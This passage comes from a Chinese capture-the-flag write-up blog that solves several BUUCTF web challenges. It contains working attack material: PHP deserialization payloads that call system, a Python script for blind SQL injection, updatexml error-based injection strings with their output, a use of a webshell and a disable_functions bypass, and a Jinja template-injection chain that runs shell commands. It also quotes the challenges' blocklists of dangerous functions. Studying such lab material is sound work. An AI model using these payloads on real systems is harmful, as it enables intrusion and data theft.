class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>phar.phar:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="keyword">array</span>(); <span class="comment">#创建数组，后面需要利用str['str']</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>(); <span class="comment">#需要利用params['source']=flag文件路径</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;params=<span class="keyword">array</span>(<span class="string">'source'</span>=&gt;/<span class="keyword">var</span>/www/html/f1ag.php);</span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;str=<span class="keyword">array</span>(<span class="string">'str'</span>=&gt;$b);<span class="comment">#触发test的__get()</span></span><br><span class="line">$c=<span class="keyword">new</span> C1e4r($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">```  </span><br><span class="line">上传,截包改后缀名    </span><br><span class="line">根据`$filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>`</span><br><span class="line">得到上传的地址  </span><br><span class="line"></span><br><span class="line">访问`file.php?file=phar:<span class="comment">//upload/66a453d5efb51fb0aaafc7840b7e5915.jpg`</span></span><br><span class="line">~~怎么又file dosen<span class="string">'t exist了啊./upload/目录下明明就有啊，拿了别人的poc试也是不行....~~</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [网鼎杯 2020 朱雀组]phpweb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">func参数输入测试回显出了这里用的函数是call_user_func()</span></span><br><span class="line"><span class="string">给了index.php的路径，读一下</span></span><br><span class="line"><span class="string">```php</span></span><br><span class="line"><span class="string">func=readfile&amp;p=/var/www/html/index.php</span></span><br></pre></td></tr></table></figure></p><p>回显如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看到类联想到反序列化(这里卡了蛮久的…不太应该…)<br>可以利用unserialize函数<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;p=<span class="string">"ls /tmp/flagoefiu4r93"</span>;</span><br><span class="line">$a-&gt;func=<span class="string">"system"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>路径是猜的，=。=，感觉要么放在sys，要么放在tmp，要么放在其他的什么地方就试了下<br>linux命令可以用<code>find / -name *flag*</code></p><h1 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h1><p><img src="04.png" alt=""><br>热点跳转截包得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /backend/content_detail.php?id=1 HTTP/1.1</span><br></pre></td></tr></table></figure></p><p>可能在id处存在注入<br><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">SQL注入ByPass的一些小技巧</a><br>测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^1^0，1^0^0</span><br></pre></td></tr></table></figure></p><p>当id=0时返回[]，而id为1时返回数据<br>利用这个特性进行异或注入  </p><p>利用<code>id=1^(length(&#39;show&#39;)=4)</code>检测是否过滤某些字符<br>过滤<code>union</code>  <code>/**/</code> <code>--+</code> 空格 <code>;</code> <code>and</code> <code>&quot;</code> <code>{}</code> <code>limit</code></p><blockquote><p>使用注释绕过，/**/<br>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格<br>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</p></blockquote><blockquote><p>ord()：ord() 函数是chr() 函数（对于8 位的ASCII 字符串）的配对函数，它以一个字符串（Unicode 字符）作为参数，返回对应的ASCII 数值，或者Unicode 数值<br>string substr(string, start, length)<br>LIMIT 0,1,从0开始取1条</p></blockquote><p>我的表名爆破好像有点问题，不论输什么都回显<code>[]</code><br>但是同样的payload爆列名却没什么问题…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">urll= <span class="string">'http://a1b1ea65-d14e-445c-a719-c623ba26a122.node3.buuoj.cn/backend/content_detail.php?id='</span></span><br><span class="line">mark=<span class="string">'[]'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def table_name():</span></span><br><span class="line"><span class="string">   #list = []</span></span><br><span class="line"><span class="string">   # for k in range(0,4):#表个数</span></span><br><span class="line"><span class="string">    name=''</span></span><br><span class="line"><span class="string">    for j in range(1,20):</span></span><br><span class="line"><span class="string">        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':          </span></span><br><span class="line"><span class="string">            url = urll+"1^if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))='%s',1,0)" %(j,i)                               </span></span><br><span class="line"><span class="string">            r = requests.get(url)</span></span><br><span class="line"><span class="string">            if mark in r.text:</span></span><br><span class="line"><span class="string">                name = name+i</span></span><br><span class="line"><span class="string">                print(name)</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">    #list.append(name)</span></span><br><span class="line"><span class="string">    print('table_name:',name)</span></span><br><span class="line"><span class="string">table_name()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def column_name():</span></span><br><span class="line"><span class="string">    #list = []</span></span><br><span class="line"><span class="string">    #for k in range(0,3): #判断表里最多有4个字段</span></span><br><span class="line"><span class="string">    name=''</span></span><br><span class="line"><span class="string">    for j in range(1,40): #判断一个 字段名最多有9个字符组成</span></span><br><span class="line"><span class="string">        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':</span></span><br><span class="line"><span class="string">            url=urll+"1^if(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),%d,1)='%s',1,0)" %(j,i)</span></span><br><span class="line"><span class="string">            r=requests.get(url)</span></span><br><span class="line"><span class="string">            if mark in r.text:</span></span><br><span class="line"><span class="string">                name=name+i</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">    #list.append(name)</span></span><br><span class="line"><span class="string">    print ('column_name:',name)</span></span><br><span class="line"><span class="string">column_name()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">res_name</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>): </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'sqcwertyuioplkjhgfdazxvbnm_0123456789,'</span>:</span><br><span class="line">            url = urll+<span class="string">"1^if(substr((select(group_concat(username))from(admin)),%d,1)='%s',1,0)"</span> %(j,i)</span><br><span class="line">            <span class="comment"># password from admin</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name+i</span><br><span class="line">                </span><br><span class="line">                print(name)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'res_name:'</span>,name)</span><br><span class="line">res_name()</span><br></pre></td></tr></table></figure></p><p><a href="http://www.ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web" target="_blank" rel="noopener">Black-Watch-入群题-Web</a><br>贴个别人的exp<br>那我这个if语句是不是有点多余…<br>他是利用ascii的大小比较直接出的结果</p><h1 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h1><p>直接传个一句话木马上去,蚁剑b64编码器连一下</p><p>执行readflag就可以读到flag<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">php7-gc-bypass</a><br>蚁剑脚本传到/tmp下  </p><p><code>include(&#39;/tmp/exp.php&#39;);</code></p><p>在脚本中改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn(&quot;echo `/readflag`&quot;);</span><br></pre></td></tr></table></figure></p><h1 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h1><p>这个和NPUCTF的验证🐎一样的<br>源码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">//delay秒后执行next()</span></span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">    <span class="comment">//1s后执行timeout</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这里next()的意思是执行下一个路由</p><p>我的理解是如果说delay&gt;1s，那么后面的setTimeout()函数就会执行，也就会出现回显”Timeout！”<br>我们需要让t的setTimeout()更快执行完毕<br>从setTimeout()入手<br><a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">setTimeout</a></p><blockquote><p>当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1行</p></blockquote><p><a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">saferEval_issue</a><br><img src="05.png" alt=""></p><h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h1><p>注册一个用户，发现可以修改密码，猜测是二次注入<br>注册<code>1&quot;</code>，changepwd.php回显<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd=&#39;c4ca4238a0b923820dcc509a6f75849b&#39;&#39; at line 1</code><br>报错注入<br>注册处username注入反映在密码修改界面<br>username，email过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格 @ order limit mid substr and right left</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;flag&apos;)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag~&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~RCTF&#123;Good job! But flag not her&apos;</span><br></pre></td></tr></table></figure><p>updatexml()输出有长度限制，32位  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)regexp(&apos;^r&apos;)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~name,pwd,email,real_flag_1s_her&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx&apos;</span><br></pre></td></tr></table></figure><p>有用的数据应该在<code>xxx</code>之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!=&apos;xxx&apos;)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;d507ee9e-9482-426f-8f0d-1c&apos;</span><br></pre></td></tr></table></figure></p><p>截取字符串的函数貌似都差不多过滤了<br>啊还可以逆序输出啊….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!=&apos;xxx&apos;))),0x7e),1)#</span><br><span class="line">&#125;5de64062c7c1-d0f8-f624-2849-e9</span><br></pre></td></tr></table></figure></p><p><a href="https://xz.aliyun.com/t/5356" target="_blank" rel="noopener">regexp盲注</a></p><blockquote><p>正常的语句为：select username from users where id = 1<br>正常返回：admin<br>构造语句：<br>select (select username from users where id = 1) regexp ‘^a’ 返回真(1)<br>select (select username from users where id = 1) regexp ‘^b’ 返回假(0)<br>因为这里’^a’是匹配以a开头的字符串，原来正常返回的就是admin，所以会返回真。<br>继续就可以使用 regexp ‘^ad’…读出想要的数据</p></blockquote><p>可以通过正则匹配来输出指定数据<br>以此来输出f开头的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)regexp(&apos;^r&apos;))),1))#</span><br></pre></td></tr></table></figure></p><h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>熟悉下<br>解密界面输入b64的会有回显  </p><p><code>&#39;DEBUG&#39;:True</code><br>解密界面只要提交无法b64decode的value就可以回显报错界面，可以借此得到一些源码信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/decode&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])</span><br><span class="line">def decode():</span><br><span class="line">    if request.values.get(&apos;text&apos;) :</span><br><span class="line">        text = request.values.get(&quot;text&quot;)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())</span><br><span class="line">        if waf(tmp) :</span><br><span class="line">            flash(&quot;no no no !!&quot;)</span><br><span class="line">            return redirect(url_for(&apos;decode&apos;))</span><br><span class="line">        ​res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure></p><p>有个waf,应该过滤了些东西  </p><p>之前写iscc的时候找到的exp模板改一改(X<br>大概过滤了<code>eval import popen os ls</code>（猜的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; #找到能用的function</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__imp&apos;+&apos;ort__&apos;+&apos;(&quot;o&apos;+&apos;s&quot;)&apos;+&apos;.po&apos;+&apos;pen&apos;+&apos;(&quot;l&apos;+&apos;s&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.py static templates</span><br></pre></td></tr></table></figure></p><p>读app.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> black_list = [<span class="string">"flag"</span>,<span class="string">"os"</span>,<span class="string">"system"</span>,<span class="string">"popen"</span>,<span class="string">"import"</span>,<span class="string">"eval"</span>,<span class="string">"chr"</span>,<span class="string">"request"</span>, <span 